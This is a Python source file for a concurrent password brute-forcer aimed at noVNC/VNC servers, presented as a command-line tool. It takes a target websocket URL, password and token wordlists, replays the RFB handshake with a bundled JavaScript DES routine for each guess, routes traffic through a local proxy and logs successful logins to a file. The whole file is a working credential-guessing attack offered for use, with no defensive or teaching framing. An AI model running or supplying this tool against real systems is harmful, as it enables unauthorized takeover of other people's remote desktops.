import gevent
from gevent import monkey
monkey.patch_socket()
from gevent.queue import Queue
from websocket import create_connection
import execjs,argparse


class BpNoVNC(object):
    def __init__(self, target, password, tokens=[""], maxsize=5):
        self.target = target
        self.maxsize = maxsize
        self.tasks = Queue()
        self.bad_token = []
        for p in password:
            for t in tokens:
                self.tasks.put((p.strip(), t.strip()))

    def _boss(self):
        while not self.tasks.empty():
            self._worker()

    def _worker(self):

        password, token = self.tasks.get()
        wsurl = "{0}/?token={1}".format(self.target, token)
        self._show("[*]",token,password)
        try:
            ws = create_connection(wsurl, http_proxy_host="127.0.0.1", http_proxy_port=8022,
                                   subprotocols=["binary", "base64"])
            result = ws.recv()
            # print(1, result)
            ws.send(b"RFB 003.008\n", opcode=2)
            result = ws.recv()
            # print(2,result)
            ws.send(b"\x02", opcode=2)
            result = ws.recv()
            # print(3,result)
            intlist = []
            for i in result[:]:
                intlist.append(i)
            data = bytes(self._get_des(password, intlist))
            # print(3,intlist)
            ws.send(data, opcode=2)
            result = ws.recv()
            # print(4,result)
            if (result == b"\x00\x00\x00\x00"):
                self._show("[+]", token, password)
            else:
                self._show("[-]", token, password)
            ws.close()
        except Exception as ex:
            print(ex)

    def _show(self, status, token, password):
        message = "{0}: {1}/?token={2} password:{3} ".format(status, self.target, token, password)
        print(message)
        self._write_file(message)

    def _write_file(self, line):
        with open("log.txt", "a+") as log_file:
            log_file.write(line + "\n")

    def _get_des(self, password, chall):
        code = '''
    
function DES(passwd) {

// Tables, permutations, S-boxes, etc.
var PC2 = [13,16,10,23, 0, 4, 2,27,14, 5,20, 9,22,18,11, 3,
           25, 7,15, 6,26,19,12, 1,40,51,30,36,46,54,29,39,
           50,44,32,47,43,48,38,55,33,52,45,41,49,35,28,31 ],
    totrot = [ 1, 2, 4, 6, 8,10,12,14,15,17,19,21,23,25,27,28],
    z = 0x0, a,b,c,d,e,f, SP1,SP2,SP3,SP4,SP5,SP6,SP7,SP8,
    keys = [];

a=1<<16; b=1<<24; c=a|b; d=1<<2; e=1<<10; f=d|e;
SP1 = [c|e,z|z,a|z,c|f,c|d,a|f,z|d,a|z,z|e,c|e,c|f,z|e,b|f,c|d,b|z,z|d,
       z|f,b|e,b|e,a|e,a|e,c|z,c|z,b|f,a|d,b|d,b|d,a|d,z|z,z|f,a|f,b|z,
       a|z,c|f,z|d,c|z,c|e,b|z,b|z,z|e,c|d,a|z,a|e,b|d,z|e,z|d,b|f,a|f,
       c|f,a|d,c|z,b|f,b|d,z|f,a|f,c|e,z|f,b|e,b|e,z|z,a|d,a|e,z|z,c|d];
a=1<<20; b=1<<31; c=a|b; d=1<<5; e=1<<15; f=d|e;
SP2 = [c|f,b|e,z|e,a|f,a|z,z|d,c|d,b|f,b|d,c|f,c|e,b|z,b|e,a|z,z|d,c|d,
       a|e,a|d,b|f,z|z,b|z,z|e,a|f,c|z,a|d,b|d,z|z,a|e,z|f,c|e,c|z,z|f,
       z|z,a|f,c|d,a|z,b|f,c|z,c|e,z|e,c|z,b|e,z|d,c|f,a|f,z|d,z|e,b|z,
       z|f,c|e,a|z,b|d,a|d,b|f,b|d,a|d,a|e,z|z,b|e,z|f,b|z,c|d,c|f,a|e];
a=1<<17; b=1<<27; c=a|b; d=1<<3; e=1<<9; f=d|e;
SP3 = [z|f,c|e,z|z,c|d,b|e,z|z,a|f,b|e,a|d,b|d,b|d,a|z,c|f,a|d,c|z,z|f,
       b|z,z|d,c|e,z|e,a|e,c|z,c|d,a|f,b|f,a|e,a|z,b|f,z|d,c|f,z|e,b|z,
       c|e,b|z,a|d,z|f,a|z,c|e,b|e,z|z,z|e,a|d,c|f,b|e,b|d,z|e,z|z,c|d,
       b|f,a|z,b|z,c|f,z|d,a|f,a|e,b|d,c|z,b|f,z|f,c|z,a|f,z|d,c|d,a|e];
a=1<<13; b=1<<23; c=a|b; d=1<<0; e=1<<7; f=d|e;
SP4 = [c|d,a|f,a|f,z|e,c|e,b|f,b|d,a|d,z|z,c|z,c|z,c|f,z|f,z|z,b|e,b|d,
       z|d,a|z,b|z,c|d,z|e,b|z,a|d,a|e,b|f,z|d,a|e,b|e,a|z,c|e,c|f,z|f,
       b|e,b|d,c|z,c|f,z|f,z|z,z|z,c|z,a|e,b|e,b|f,z|d,c|d,a|f,a|f,z|e,
       c|f,z|f,z|d,a|z,b|d,a|d,c|e,b|f,a|d,a|e,b|z,c|d,z|e,b|z,a|z,c|e];
a=1<<25; b=1<<30; c=a|b; d=1<<8; e=1<<19; f=d|e;
SP5 = [z|d,a|f,a|e,c|d,z|e,z|d,b|z,a|e,b|f,z|e,a|d,b|f,c|d,c|e,z|f,b|z,
       a|z,b|e,b|e,z|z,b|d,c|f,c|f,a|d,c|e,b|d,z|z,c|z,a|f,a|z,c|z,z|f,
       z|e,c|d,z|d,a|z,b|z,a|e,c|d,b|f,a|d,b|z,c|e,a|f,b|f,z|d,a|z,c|e,
       c|f,z|f,c|z,c|f,a|e,z|z,b|e,c|z,z|f,a|d,b|d,z|e,z|z,b|e,a|f,b|d];
a=1<<22; b=1<<29; c=a|b; d=1<<4; e=1<<14; f=d|e;
SP6 = [b|d,c|z,z|e,c|f,c|z,z|d,c|f,a|z,b|e,a|f,a|z,b|d,a|d,b|e,b|z,z|f,
       z|z,a|d,b|f,z|e,a|e,b|f,z|d,c|d,c|d,z|z,a|f,c|e,z|f,a|e,c|e,b|z,
       b|e,z|d,c|d,a|e,c|f,a|z,z|f,b|d,a|z,b|e,b|z,z|f,b|d,c|f,a|e,c|z,
       a|f,c|e,z|z,c|d,z|d,z|e,c|z,a|f,z|e,a|d,b|f,z|z,c|e,b|z,a|d,b|f];
a=1<<21; b=1<<26; c=a|b; d=1<<1; e=1<<11; f=d|e;
SP7 = [a|z,c|d,b|f,z|z,z|e,b|f,a|f,c|e,c|f,a|z,z|z,b|d,z|d,b|z,c|d,z|f,
       b|e,a|f,a|d,b|e,b|d,c|z,c|e,a|d,c|z,z|e,z|f,c|f,a|e,z|d,b|z,a|e,
       b|z,a|e,a|z,b|f,b|f,c|d,c|d,z|d,a|d,b|z,b|e,a|z,c|e,z|f,a|f,c|e,
       z|f,b|d,c|f,c|z,a|e,z|z,z|d,c|f,z|z,a|f,c|z,z|e,b|d,b|e,z|e,a|d];
a=1<<18; b=1<<28; c=a|b; d=1<<6; e=1<<12; f=d|e;
SP8 = [b|f,z|e,a|z,c|f,b|z,b|f,z|d,b|z,a|d,c|z,c|f,a|e,c|e,a|f,z|e,z|d,
       c|z,b|d,b|e,z|f,a|e,a|d,c|d,c|e,z|f,z|z,z|z,c|d,b|d,b|e,a|f,a|z,
       a|f,a|z,c|e,z|e,z|d,c|d,z|e,a|f,b|e,z|d,b|d,c|z,c|d,b|z,a|z,b|f,
       z|z,c|f,a|d,b|d,c|z,b|e,b|f,z|z,c|f,a|e,a|e,z|f,z|f,a|d,b|z,c|e];

// Set the key.
function setKeys(keyBlock) {
    var i, j, l, m, n, o, pc1m = [], pcr = [], kn = [],
        raw0, raw1, rawi, KnLi;

    for (j = 0, l = 56; j < 56; ++j, l-=8) {
        l += l<-5 ? 65 : l<-3 ? 31 : l<-1 ? 63 : l===27 ? 35 : 0; // PC1
        m = l & 0x7;
        pc1m[j] = ((keyBlock[l >>> 3] & (1<<m)) !== 0) ? 1: 0;
    }

    for (i = 0; i < 16; ++i) {
        m = i << 1;
        n = m + 1;
        kn[m] = kn[n] = 0;
        for (o=28; o<59; o+=28) {
            for (j = o-28; j < o; ++j) {
                l = j + totrot[i];
                if (l < o) {
                    pcr[j] = pc1m[l];
                } else {
                    pcr[j] = pc1m[l - 28];
                }
            }
        }
        for (j = 0; j < 24; ++j) {
            if (pcr[PC2[j]] !== 0) {
                kn[m] |= 1<<(23-j);
            }
            if (pcr[PC2[j + 24]] !== 0) {
                kn[n] |= 1<<(23-j);
            }
        }
    }

    // cookey
    for (i = 0, rawi = 0, KnLi = 0; i < 16; ++i) {
        raw0 = kn[rawi++];
        raw1 = kn[rawi++];
        keys[KnLi] = (raw0 & 0x00fc0000) << 6;
        keys[KnLi] |= (raw0 & 0x00000fc0) << 10;
        keys[KnLi] |= (raw1 & 0x00fc0000) >>> 10;
        keys[KnLi] |= (raw1 & 0x00000fc0) >>> 6;
        ++KnLi;
        keys[KnLi] = (raw0 & 0x0003f000) << 12;
        keys[KnLi] |= (raw0 & 0x0000003f) << 16;
        keys[KnLi] |= (raw1 & 0x0003f000) >>> 4;
        keys[KnLi] |= (raw1 & 0x0000003f);
        ++KnLi;
    }
}

// Encrypt 8 bytes of text
function enc8(text) {
    var i = 0, b = text.slice(), fval, keysi = 0,
        l, r, x; // left, right, accumulator

    // Squash 8 bytes to 2 ints
    l = b[i++]<<24 | b[i++]<<16 | b[i++]<<8 | b[i++];
    r = b[i++]<<24 | b[i++]<<16 | b[i++]<<8 | b[i++];

    x = ((l >>> 4) ^ r) & 0x0f0f0f0f;
    r ^= x;
    l ^= (x << 4);
    x = ((l >>> 16) ^ r) & 0x0000ffff;
    r ^= x;
    l ^= (x << 16);
    x = ((r >>> 2) ^ l) & 0x33333333;
    l ^= x;
    r ^= (x << 2);
    x = ((r >>> 8) ^ l) & 0x00ff00ff;
    l ^= x;
    r ^= (x << 8);
    r = (r << 1) | ((r >>> 31) & 1);
    x = (l ^ r) & 0xaaaaaaaa;
    l ^= x;
    r ^= x;
    l = (l << 1) | ((l >>> 31) & 1);

    for (i = 0; i < 8; ++i) {
        x = (r << 28) | (r >>> 4);
        x ^= keys[keysi++];
        fval =  SP7[x & 0x3f];
        fval |= SP5[(x >>> 8) & 0x3f];
        fval |= SP3[(x >>> 16) & 0x3f];
        fval |= SP1[(x >>> 24) & 0x3f];
        x = r ^ keys[keysi++];
        fval |= SP8[x & 0x3f];
        fval |= SP6[(x >>> 8) & 0x3f];
        fval |= SP4[(x >>> 16) & 0x3f];
        fval |= SP2[(x >>> 24) & 0x3f];
        l ^= fval;
        x = (l << 28) | (l >>> 4);
        x ^= keys[keysi++];
        fval =  SP7[x & 0x3f];
        fval |= SP5[(x >>> 8) & 0x3f];
        fval |= SP3[(x >>> 16) & 0x3f];
        fval |= SP1[(x >>> 24) & 0x3f];
        x = l ^ keys[keysi++];
        fval |= SP8[x & 0x0000003f];
        fval |= SP6[(x >>> 8) & 0x3f];
        fval |= SP4[(x >>> 16) & 0x3f];
        fval |= SP2[(x >>> 24) & 0x3f];
        r ^= fval;
    }

    r = (r << 31) | (r >>> 1);
    x = (l ^ r) & 0xaaaaaaaa;
    l ^= x;
    r ^= x;
    l = (l << 31) | (l >>> 1);
    x = ((l >>> 8) ^ r) & 0x00ff00ff;
    r ^= x;
    l ^= (x << 8);
    x = ((l >>> 2) ^ r) & 0x33333333;
    r ^= x;
    l ^= (x << 2);
    x = ((r >>> 16) ^ l) & 0x0000ffff;
    l ^= x;
    r ^= (x << 16);
    x = ((r >>> 4) ^ l) & 0x0f0f0f0f;
    l ^= x;
    r ^= (x << 4);

    // Spread ints to bytes
    x = [r, l];
    for (i = 0; i < 8; i++) {
        b[i] = (x[i>>>2] >>> (8*(3 - (i%4)))) % 256;
        if (b[i] < 0) { b[i] += 256; } // unsigned
    }
    return b;
}

// Encrypt 16 bytes of text using passwd as key
function encrypt(t) {
    return enc8(t.slice(0,8)).concat(enc8(t.slice(8,16)));
}

setKeys(passwd);             // Setup keys
return {'encrypt': encrypt}; // Public interface

} // function DES



    function genDES(password, challenge) {
    var i, passwd = [];
    for (i=0; i < password.length; i += 1) {
        passwd.push(password.charCodeAt(i));
    }
    return (new DES(passwd)).encrypt(challenge);
}

    '''
        js = execjs.compile(code)
        return js.call('genDES', password, chall)

    def run(self):
        allr = [gevent.spawn(self._boss) for i in range(self.maxsize)]
        gevent.joinall(allr)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help=" -t ws://1.2.1.1:6080/")
    parser.add_argument('-tf', '--tokenfile', help="-tf token.txt")
    parser.add_argument('-pf', '--passfile', help="-pf pass.txt")
    parser.add_argument('-m', '--maxsize', help="maxsize threads", default=20, type=int)
    args = parser.parse_args()

    if args.tokenfile:
        with open(args.tokenfile) as f:
            tokens = f.readlines()
    else:
        tokens = [""]

    if  args.passfile and  args.target:
        with open(args.passfile) as f:
            passwords = f.readlines()
        BpNoVNC(args.target, passwords, tokens,args.maxsize).run()

